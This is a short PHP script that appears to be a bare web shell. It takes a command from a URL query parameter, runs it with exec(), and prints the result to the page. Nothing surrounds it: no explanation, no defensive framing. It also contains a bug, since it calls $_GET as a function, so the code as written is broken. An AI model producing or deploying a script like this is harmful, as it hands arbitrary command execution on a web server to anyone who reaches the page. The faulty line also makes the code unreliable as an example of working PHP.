<?php
  $command = $_GET('command');
  $output;
  $return;
  exec($command, $output, $return);
  echo 'output : ';
  print_r($output);
  echo '<br>'
?>
